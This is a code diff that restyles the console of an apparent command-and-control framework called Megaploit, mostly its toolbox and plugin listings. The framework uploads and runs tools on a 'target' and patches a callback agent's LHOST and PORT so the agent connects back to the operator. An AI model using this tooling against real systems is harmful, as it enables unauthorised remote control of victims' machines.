+                    f"{_c(f'v{p.version}', _DIM):<{10 + 9}}  {_c(desc, _GREY)}  {ncmds}"
                 )
             lines.append("")
 
@@ -628,61 +754,41 @@ class Console:
     # ---------------------------------------------------------------
 
     def _cmd_toolbox(self, args: list[str]) -> None:
-        """
-        toolbox install <repo_url> <name> [description] [--tags a,b,c]
-        toolbox list
-        toolbox search <query>
-        toolbox info <name>
-        toolbox remove <name>
-        toolbox update <name>
-        toolbox rebuild <name>
-        toolbox set-entry <name> <entry_path>
-        """
         if not args:
             self._toolbox_help()
             return
 
-        sub = args[0].lower()
+        sub  = args[0].lower()
         rest = args[1:]
 
-        if sub == "install":
-            self._toolbox_install(rest)
-        elif sub == "list":
-            self._toolbox_list()
-        elif sub == "search":
-            self._toolbox_search(rest)
-        elif sub == "info":
-            self._toolbox_info(rest)
-        elif sub == "remove":
-            self._toolbox_remove(rest)
-        elif sub == "update":
-            self._toolbox_update(rest)
-        elif sub == "update-all":
-            self._toolbox_update_all()
-        elif sub == "check-updates":
-            self._toolbox_check_updates()
-        elif sub == "rebuild":
-            self._toolbox_rebuild(rest)
-        elif sub == "set-entry":
-            self._toolbox_set_entry(rest)
+        dispatch_map = {
+            "install":       lambda: self._toolbox_install(rest),
+            "list":          lambda: self._toolbox_list(),
+            "search":        lambda: self._toolbox_search(rest),
+            "info":          lambda: self._toolbox_info(rest),
+            "remove":        lambda: self._toolbox_remove(rest),
+            "update":        lambda: self._toolbox_update(rest),
+            "update-all":    lambda: self._toolbox_update_all(),
+            "check-updates": lambda: self._toolbox_check_updates(),
+            "rebuild":       lambda: self._toolbox_rebuild(rest),
+            "set-entry":     lambda: self._toolbox_set_entry(rest),
+        }
+        fn = dispatch_map.get(sub)
+        if fn:
+            fn()
         else:
-            print(err(f"Unknown toolbox sub-command: {sub}"))
+            print(err(f"Unknown toolbox sub-command: {_c(sub, _BOLD)}"))
             self._toolbox_help()
 
     # ------------------------------------------------------------------
 
     def _toolbox_install(self, args: list[str]) -> None:
-        """
-        toolbox install <repo_url> <name> [description] [--tags tag1,tag2]
-        """
         if len(args) < 2:
             print(err("Usage: toolbox install <repo_url> <name> [description] [--tags a,b]"))
             return
 
-        repo_url = args[0]
-        name     = args[1]
-
-        # Parse optional description and --tags
+        repo_url    = args[0]
+        name        = args[1]
         description = ""
         tags: list[str] = []
         i = 2
@@ -694,21 +800,29 @@ class Console:
                 description += (" " if description else "") + args[i]
                 i += 1
 
-        print(info(f"Installing '{name}' from {repo_url}"))
+        print()
+        print(_box_top(f"Installing  {name}"))
+        print(_box_row(_kv("Source", _c(repo_url, _GREY))))
+        if tags:
+            print(_box_row(_kv("Tags", _c(", ".join(tags), _CYAN))))
+        print(_box_bot())
         print()
 
+        # Track build stages for a simple progress bar
+        _STAGES = ["clone", "detect", "build", "deps", "entry", "register"]
+        pb = _ProgressBar(total=len(_STAGES), label="cloning…")
+
         def _progress(line: str) -> None:
-            # Colour [+]/[-]/[*] lines, pass the rest through dim
-            if line.startswith("[+]"):
-                print(_c(line, _GREEN))
-            elif line.startswith("[-]"):
-                print(_c(line, _RED))
-            elif line.startswith("[*]"):
-                print(_c(line, _CYAN))
-            elif line.startswith("[!]"):
-                print(_c(line, _YELLOW))
-            else:
-                print(_c(line, _GREY))
+            # Advance bar on recognisable milestones
+            if   "[*] Cloning"    in line: pb.set_label("cloning…")
+            elif "[*] Detected"   in line: pb.step(); pb.set_label("building…")
+            elif "[+] Go build"   in line: pb.step(); pb.set_label("go build…")
+            elif "[+] Rust build" in line: pb.step(); pb.set_label("cargo…")
+            elif "[+] Maven"      in line: pb.step(); pb.set_label("mvn…")
+            elif "[+] npm"        in line: pb.step(); pb.set_label("npm…")
+            elif "[+] Python"     in line: pb.step(); pb.set_label("pip…")
+            elif "[*] Entry"      in line: pb.step(); pb.set_label("registering…")
+            elif "[+]"            in line: pb.step()
 
         try:
             with _Spinner(f"Cloning {repo_url}…"):
@@ -719,44 +833,52 @@ class Console:
                     tags=tags,
                     progress=_progress,
                 )
+            pb.finish()
             print()
-            print(ok(f"Tool '{name}' installed successfully."))
-            print(info(f"  Entry-point : {tool.entry}"))
-            print(info(f"  Path        : {tool.path}"))
-            print(info(f"  Run locally : toolbox_run {name} [args]  (inside a session)"))
-            print(info(f"  Deploy      : toolbox_deploy {name} [args]  (inside a session)"))
+            print(_box_top(f"✓  {name}  installed", color=_GREEN))
+            print(_box_row(_kv("Entry-point", _c(tool.entry, _WHITE)),  color=_GREEN))
+            print(_box_row(_kv("Language",    _c(tool.lang,  _YELLOW)), color=_GREEN))
+            print(_box_row(_kv("Path",        _c(tool.path,  _GREY)),   color=_GREEN))
+            print(_box_row(_kv("Run locally", _c(f"toolbox_run {name} [args]", _CYAN)), color=_GREEN))
+            print(_box_row(_kv("Deploy",      _c(f"toolbox_deploy {name} [args]", _CYAN)), color=_GREEN))
+            print(_box_bot(color=_GREEN))
         except RuntimeError as e:
+            pb.finish()
             print(err(str(e)))
 
     def _toolbox_list(self) -> None:
         tools = _tool_registry.all()
         if not tools:
-            print(info("No tools installed.  Use:  toolbox install <url> <name>"))
+            print(info(f"No tools installed.  Use:  {_c('toolbox install <url> <name>', _CYAN)}"))
             return
         print()
-        hdr = f"  {'NAME':<18} {'STATUS':<10} {'ENTRY':<22} {'DESCRIPTION'}"
+        hdr = f"  {'':2}{'NAME':<18} {'LANG':<10} {'ENTRY':<22} DESCRIPTION"
         print(_c(hdr, _BOLD, _WHITE))
-        print(_c("  " + "─" * 72, _GREY))
+        print(_rule("─"))
         for t in tools:
-            status = _c("installed", _GREEN) if t.is_installed else _c("missing",  _RED)
-            desc   = t.description[:40] + ("…" if len(t.description) > 40 else "")
-            print(f"  {_c(t.name, _CYAN):<27} {status:<19} {t.entry:<22} {_c(desc, _GREY)}")
+            dot  = _c("●", _GREEN) if t.is_installed else _c("○", _RED)
+            lang = _c(f"[{t.lang}]", _YELLOW)
+            desc = t.description[:36] + ("…" if len(t.description) > 36 else "")
+            entry = (t.entry[:20] + "…") if len(t.entry) > 20 else t.entry
+            print(f"  {dot} {_c(t.name, _CYAN):<{17 + 9}} {lang:<{10 + 9}} {entry:<22} {_c(desc, _GREY)}")
         print()
 
     def _toolbox_search(self, args: list[str]) -> None:
         if not args:
             print(err("Usage: toolbox search <query>"))
             return
-        query = " ".join(args)
+        query   = " ".join(args)
         results = _tool_registry.search(query)
         if not results:
-            print(info(f"No tools match '{query}'."))
+            print(info(f"No tools match {_c(repr(query), _YELLOW)}."))
             return
         print()
         for t in results:
-            status = _c("✔", _GREEN) if t.is_installed else _c("✘", _RED)
-            print(f"  {status} {_c(t.name, _CYAN):<22}  {t.description[:60]}")
-            print(f"     {_c(t.repo, _GREY)}")
+            dot = _c("●", _GREEN) if t.is_installed else _c("○", _RED)
+            print(f"  {dot} {_c(t.name, _CYAN, _BOLD):<{22 + 9}}  {t.description[:60]}")
+            print(f"       {_c(t.repo, _GREY)}")
+            if t.tags:
+                print(f"       {' '.join(_c(tag, _DIM) for tag in t.tags)}")
         print()
 
     def _toolbox_info(self, args: list[str]) -> None:
@@ -767,24 +889,26 @@ class Console:
         if not t:
             print(err(f"Tool '{args[0]}' not found."))
             return
-        installed = _c("yes", _GREEN) if t.is_installed else _c("no", _RED)
         run_cmd_str = " ".join(t.run_cmd) if t.run_cmd else _c("(auto)", _GREY)
+        dot = _c("● installed", _GREEN) if t.is_installed else _c("○ missing", _RED)
         print()
-        print(f"  {_c('Name', _BOLD):<22}  {_c(t.name, _CYAN)}")
-        print(f"  {'Repo':<18}  {t.repo}")
-        print(f"  {'Description':<18}  {t.description}")
-        print(f"  {'Language':<18}  {_c(t.lang, _YELLOW)}")
-        print(f"  {'Run command':<18}  {run_cmd_str}")
-        print(f"  {'Entry-point':<18}  {t.entry}")
-        print(f"  {'Path':<18}  {t.path}")
-        print(f"  {'Installed':<18}  {installed}")
-        print(f"  {'Installed at':<18}  {t.installed_at or 'unknown'}")
+        print(_box_top(f"Tool: {t.name}"))
+        print(_box_row(_kv("Name",         _c(t.name, _CYAN, _BOLD))))
+        print(_box_row(_kv("Status",       dot)))
+        print(_box_row(_kv("Language",     _c(t.lang, _YELLOW))))
+        print(_box_row(_kv("Repository",   _c(t.repo, _GREY))))
+        print(_box_row(_kv("Description",  t.description[:58])))
+        print(_box_row(_kv("Entry-point",  _c(t.entry, _WHITE))))
+        print(_box_row(_kv("Run command",  _c(run_cmd_str, _DIM))))
+        print(_box_row(_kv("Path",         _c(t.path, _GREY))))
+        print(_box_row(_kv("Installed at", t.installed_at or "unknown")))
         if t.tags:
-            print(f"  {'Tags':<18}  {', '.join(t.tags)}")
+            print(_box_row(_kv("Tags", "  ".join(_c(tag, _CYAN) for tag in t.tags))))
+        print(_box_bot())
         print()
         print(f"  {_c('Session usage:', _BOLD, _WHITE)}")
-        print(f"    toolbox_run {t.name} [tool-args]       ← run locally vs target")
-        print(f"    toolbox_deploy {t.name} [tool-args]    ← run on the target machine")
+        print(f"    {_c('toolbox_run', _CYAN)} {t.name} {_c('[args]', _GREY)}")
+        print(f"    {_c('toolbox_deploy', _CYAN)} {t.name} {_c('[args]', _GREY)}")
         print()
 
     def _toolbox_remove(self, args: list[str]) -> None:
@@ -792,7 +916,9 @@ class Console:
             print(err("Usage: toolbox remove <name>"))
             return
         name = args[0]
-        confirm = input(warn(f"  Remove '{name}' and delete its directory? (yes/no): ")).strip()
+        print()
+        print(_c(f"  ⚠  Remove '{name}' and delete all its files?", _YELLOW, _BOLD))
+        confirm = input(_c("     Type YES to confirm: ", _YELLOW)).strip()
         if confirm.lower() != "yes":
             print(warn("  Cancelled."))
             return
@@ -806,16 +932,18 @@ class Console:
         if not args:
             print(err("Usage: toolbox update <name>"))
             return
+        name = args[0]
+        print(info(f"Updating {_c(name, _CYAN)}…"))
         try:
-            _installer.update(args[0], progress=print)
-            # Re-check so the update badge clears
+            with _Spinner(f"Pulling & rebuilding {name}…"):
+                _installer.update(name, progress=lambda l: None)
+            print(ok(f"'{name}' updated."))
             if self._updater:
                 self._updater.check_now()
         except RuntimeError as e:
             print(err(str(e)))
 
     def _toolbox_update_all(self) -> None:
-        """Pull latest changes for every installed tool."""
         tools = _tool_registry.all()
         if not tools:
             print(info("No tools installed."))
@@ -826,8 +954,9 @@ class Console:
                 print(warn(f"  Skipping '{t.name}' — directory not found"))
                 continue
             try:
-                print(info(f"Updating '{t.name}'…"))
-                _installer.update(t.name, progress=lambda l: print(f"  {l}"))
+                with _Spinner(f"Updating {t.name}…"):
+                    _installer.update(t.name, progress=lambda l: None)
+                print(ok(f"'{t.name}' updated."))
                 any_ok = True
             except RuntimeError as e:
                 print(err(f"  {t.name}: {e}"))
@@ -835,18 +964,16 @@ class Console:
             self._updater.check_now()
 
     def _toolbox_check_updates(self) -> None:
-        """Force an immediate update check for all tools and Megaploit itself."""
         print(info("Checking for updates…"))
         if self._updater:
             self._updater.check_now()
-            time.sleep(2)   # give background thread a moment to finish
+            time.sleep(2)
             for note in self._updater.drain():
                 print(note)
         else:
             print(warn("Update checker not running (git not on PATH?)."))
 
     def _toolbox_rebuild(self, args: list[str]) -> None:
-        """Re-run the build step for an already-installed tool (no git pull)."""
         if not args:
             print(err("Usage: toolbox rebuild <name>"))
             return
@@ -860,11 +987,13 @@ class Console:
             return
         print(info(f"Rebuilding '{name}'…"))
         try:
-            t.run_cmd = _installer.build(t.path, name, t.lang, progress=print)
-            new_entry = _installer.detect_entry(t.path, name, t.lang)
-            t.entry = new_entry
+            with _Spinner(f"Building {name}…"):
+                t.run_cmd  = _installer.build(t.path, name, t.lang, progress=lambda l: None)
+                t.entry    = _installer.detect_entry(t.path, name, t.lang)
             _tool_registry.add(t)
-            print(ok(f"'{name}' rebuilt.  Entry: {new_entry}  run_cmd: {t.run_cmd}"))
+            print(ok(f"'{name}' rebuilt."))
+            print(f"  {_kv('Entry',   _c(t.entry,          _WHITE))}")
+            print(f"  {_kv('Command', _c(' '.join(t.run_cmd), _GREY))}")
         except RuntimeError as e:
             print(err(str(e)))
 
@@ -878,29 +1007,32 @@ class Console:
             print(err(f"Tool '{name}' not found."))
             return
         t.entry = entry
-        _tool_registry.add(t)   # re-saves with updated entry
-        print(ok(f"Entry-point for '{name}' set to: {entry}"))
+        _tool_registry.add(t)
+        print(ok(f"Entry-point for '{name}'  →  {_c(entry, _CYAN)}"))
 
     def _toolbox_help(self) -> None:
+        def _r(cmd: str, desc: str) -> str:
+            return f"  {_c(cmd, _CYAN):<{36 + 9}}  {_c(desc, _GREY)}"
+
         lines = [
             "",
-            _c("  toolbox sub-commands", _BOLD, _WHITE),
-            _c("  " + "─" * 50, _GREY),
-            f"  {'toolbox install <url> <name>':<36}  Clone & install from GitHub",
-            f"  {'toolbox list':<36}  Show all installed tools",
-            f"  {'toolbox search <query>':<36}  Search by name/tag/description",
-            f"  {'toolbox info <name>':<36}  Show tool details & usage",
-            f"  {'toolbox update <name>':<36}  Pull latest changes (git pull)",
-            f"  {'toolbox update-all':<36}  Update every installed tool at once",
-            f"  {'toolbox check-updates':<36}  Check now for available updates",
-            f"  {'toolbox remove <name>':<36}  Uninstall a tool",
-            f"  {'toolbox rebuild <name>':<36}  Re-run build step (no git pull)",
-            f"  {'toolbox set-entry <name> <path>':<36}  Override the entry-point",
+            _section("toolbox sub-commands"),
             "",
-            _c("  Inside a session:", _BOLD, _WHITE),
-            _c("  " + "─" * 50, _GREY),
-            f"  {'toolbox_run <name> [args]':<36}  Run tool locally (operator side)",
-            f"  {'toolbox_deploy <name> [args]':<36}  Upload & run tool on target",
+            _r("toolbox install <url> <name>",  "Clone & install from GitHub"),
+            _r("toolbox list",                  "Show all installed tools"),
+            _r("toolbox search <query>",        "Search by name / tag / description"),
+            _r("toolbox info <name>",           "Show tool details & usage"),
+            _r("toolbox update <name>",         "Pull latest changes (git pull + rebuild)"),
+            _r("toolbox update-all",            "Update every installed tool at once"),
+            _r("toolbox check-updates",         "Check now for available updates"),
+            _r("toolbox rebuild <name>",        "Re-run build step (no git pull)"),
+            _r("toolbox remove <name>",         "Uninstall a tool"),
+            _r("toolbox set-entry <name> <p>",  "Override the entry-point path"),
+            "",
+            _section("Inside a session"),
+            "",
+            _r("toolbox_run <name> [args]",     "Run tool locally (operator side)"),
+            _r("toolbox_deploy <name> [args]",  "Upload & run tool on target"),
             "",
         ]
         print("\n".join(lines))
@@ -910,13 +1042,7 @@ class Console:
     # ---------------------------------------------------------------
 
     def _cmd_plugins(self, args: list[str]) -> None:
-        """
-        plugins              — list all loaded plugins and their commands
-        plugins reload       — re-scan plugins/ and reload everything
-        plugins info <name>  — show full details for one plugin
-        """
         sub = args[0].lower() if args else "list"
-
         if sub in ("list", "ls"):
             self._plugins_list()
         elif sub == "reload":
@@ -924,34 +1050,30 @@ class Console:
         elif sub == "info":
             self._plugins_info(args[1:])
         else:
-            # Treat unknown sub-commands as the plugin name for quick info
             self._plugins_info(args)
 
     def _plugins_list(self) -> None:
         plugins = _plugin_loader.plugins()
         if not plugins:
             print(info("No plugins loaded."))
-            print(info("Drop a .toml file into the  plugins/  directory and run  plugins reload"))
+            print(info(f"Drop a .toml file into  {_c('plugins/', _CYAN)}  then run  {_c('plugins reload', _CYAN)}"))
             return
         print()
-        hdr = f"  {'PLUGIN':<20} {'VER':<10} {'CMDS':<6} {'DESCRIPTION'}"
+        hdr = f"  {'PLUGIN':<20} {'VER':<10} {'CMDS':<6} DESCRIPTION"
         print(_c(hdr, _BOLD, _WHITE))
-        print(_c("  " + "─" * 68, _GREY))
+        print(_rule("─"))
         for p in plugins:
             ncmds = str(len(p.commands))
             desc  = p.description[:42] + ("…" if len(p.description) > 42 else "")
-            print(
-                f"  {_c(p.name, _CYAN):<29} {p.version:<10} {ncmds:<6} {_c(desc, _GREY)}"
-            )
+            print(f"  {_c('◆', _MAGENTA)} {_c(p.name, _CYAN):<{19 + 9}} {p.version:<10} {ncmds:<6} {_c(desc, _GREY)}")
         print()
-        # Show all plugin command names for tab-complete awareness
         all_cmd_names = _plugin_loader.all_command_names()
         if all_cmd_names:
-            print(_c("  Plugin commands:", _BOLD, _WHITE))
+            print(_section("Plugin commands"))
             for cname in all_cmd_names:
-                pc = _plugin_loader.get_command(cname)
-                tag = _c(" [!]", _RED) if pc.dangerous else ""
-                print(f"    {_c(cname, _GREEN):<28}  {pc.description}{tag}")
+                pc  = _plugin_loader.get_command(cname)
+                tag = _c("  [!]", _RED) if pc.dangerous else ""
+                print(f"    {_c(cname, _GREEN):<{28 + 9}}  {_c(pc.description, _GREY)}{tag}")
             print()
 
     def _plugins_reload(self) -> None:
@@ -960,7 +1082,7 @@ class Console:
         if loaded:
             print(ok(f"Loaded {loaded} plugin(s)."))
         else:
-            print(info("No plugins found in  plugins/"))
+            print(info(f"No plugins found in  {_c('plugins/', _CYAN)}"))
         for fname, msg in _plugin_loader.errors():
             print(warn(f"  Error in '{fname}': {msg}"))
 
@@ -973,19 +1095,19 @@ class Console:
             print(err(f"Plugin '{args[0]}' not loaded."))
             return
         print()
-        print(f"  {_c('Name', _BOLD):<22}  {_c(p.name, _CYAN)}")
-        print(f"  {'Version':<18}  {p.version}")
-        print(f"  {'Author':<18}  {p.author or '(unknown)'}")
-        print(f"  {'Description':<18}  {p.description}")
-        print(f"  {'Source file':<18}  {p.source_path}")
-        print()
+        print(_box_top(f"Plugin: {p.name}"))
+        print(_box_row(_kv("Name",        _c(p.name, _CYAN, _BOLD))))
+        print(_box_row(_kv("Version",     p.version)))
+        print(_box_row(_kv("Author",      p.author or "(unknown)")))
+        print(_box_row(_kv("Description", p.description[:58])))
+        print(_box_row(_kv("Source",      _c(p.source_path, _GREY))))
+        print(_box_bot())
         if p.commands:
-            print(_c("  Commands:", _BOLD, _WHITE))
-            print(_c("  " + "─" * 60, _GREY))
+            print(_section("Commands"))
             for pc in p.commands:
-                tag = _c("  [dangerous]", _RED) if pc.dangerous else ""
+                tag      = _c("  [dangerous]", _RED) if pc.dangerous else ""
                 kind_col = _c(f"[{pc.kind}]", _YELLOW)
-                print(f"  {_c(pc.usage or pc.name, _GREEN):<30}  {kind_col}  {pc.description}{tag}")
+                print(f"  {_c(pc.usage or pc.name, _GREEN):<{30 + 9}}  {kind_col}  {_c(pc.description, _GREY)}{tag}")
         print()
 
     # ---------------------------------------------------------------
@@ -994,6 +1116,7 @@ class Console:
 
     def _shutdown(self) -> None:
         print()
+        print(_rule("─", color=_RED))
         print(info("Shutting down…"))
         if self._updater:
             self._updater.stop()
@@ -1003,15 +1126,26 @@ class Console:
             for sess in self._sessions.values():
                 sess.close()
         print(ok("Goodbye."))
+        print(_rule("─", color=_RED))
 
+
+# ---------------------------------------------------------------------------
+# Options display helper
+# ---------------------------------------------------------------------------
 
 def _show_options(console: Console) -> None:
-    print(f"\n  {'Option':<10}  Value")
-    print(f"  {'─' * 10}  {'─' * 20}")
-    print(f"  {'lhost':<10}  {console.lhost or '(not set)'}")
-    print(f"  {'port':<10}  {console.port}")
-    print(f"  {'cert':<10}  {console.cert or '(none)'}")
-    print(f"  {'key':<10}  {console.key_file or '(none)'}")
+    print()
+    print(_c(f"  {'Option':<12}  Value", _BOLD, _WHITE))
+    print(_rule("─", width=40))
+    for key, val in (
+        ("lhost",       console.lhost or "(not set)"),
+        ("port",        str(console.port)),
+        ("cert",        console.cert or "(none)"),
+        ("key",         console.key_file or "(none)"),
+        ("auto_update", "on" if console.auto_update else "off"),
+    ):
+        val_col = _c(val, _WHITE) if val not in ("(not set)", "(none)", "off") else _c(val, _DIM)
+        print(f"  {_c(key, _YELLOW):<{12 + 9}}  {val_col}")
     print()
 
 
@@ -1020,33 +1154,18 @@ def _show_options(console: Console) -> None:
 # ---------------------------------------------------------------------------
 
 def _patch_agent(lhost: str, port: int, use_tls: bool = False) -> None:
-    """
-    Patch LHOST/PORT/USE_TLS values in agent.py so the agent connects back
-    to the correct server.  Also patches megaploit/agent/connection.py directly
-    so that the values take effect when agent.py imports the module.
-    """
     _patch_connection_module(lhost, port, use_tls)
-    print(ok(f"agent.py patched: LHOST={lhost}  PORT={port}  USE_TLS={use_tls}"))
+    print(ok(f"agent.py patched  —  LHOST={_c(lhost, _CYAN)}  PORT={_c(str(port), _CYAN)}  TLS={_c(str(use_tls), _CYAN)}"))
 
 
 def _patch_connection_module(lhost: str, port: int, use_tls: bool) -> None:
-    """Overwrite the LHOST / PORT / USE_TLS lines in connection.py using regex."""
-    import re
     path = os.path.join("megaploit", "agent", "connection.py")
     try:
         with open(path, "r", encoding="utf-8") as f:
             src = f.read()
-
-        src = re.sub(r'^LHOST\s*=.*$',
-                     f'LHOST   = "{lhost}"',
-                     src, flags=re.MULTILINE)
-        src = re.sub(r'^PORT\s*=.*$',
-                     f'PORT    = {port}',
-                     src, flags=re.MULTILINE)
-        src = re.sub(r'^USE_TLS\s*=.*$',
-                     f'USE_TLS = {use_tls}   # patched by server',
-                     src, flags=re.MULTILINE)
-
+        src = re.sub(r'^LHOST\s*=.*$',   f'LHOST   = "{lhost}"',             src, flags=re.MULTILINE)
+        src = re.sub(r'^PORT\s*=.*$',    f'PORT    = {port}',                src, flags=re.MULTILINE)
+        src = re.sub(r'^USE_TLS\s*=.*$', f'USE_TLS = {use_tls}   # patched', src, flags=re.MULTILINE)
         with open(path, "w", encoding="utf-8") as f:
             f.write(src)
     except IOError as e:
